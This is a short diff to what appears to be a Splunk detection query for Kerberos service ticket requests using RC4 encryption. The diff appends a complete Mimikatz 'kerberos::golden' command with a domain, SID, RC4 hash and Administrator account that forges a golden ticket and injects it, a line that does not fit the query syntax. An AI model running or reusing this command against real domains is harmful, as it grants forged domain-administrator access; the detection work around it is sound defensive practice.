@@ -148,3 +148,5 @@ index=windows EventCode=4769
 | `security_content_ctime(lastTime)` 
 | `security_content_ctime(firstTime)` 
 | `kerberos_service_ticket_request_using_rc4_encryption_filter`
+
+kerberos::golden /domain:cs.org /sid:S-1-5-21-1833177430-4054197050-709912635 /rc4:9fd6073cd1b3969263ea36f50e787938 /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt   
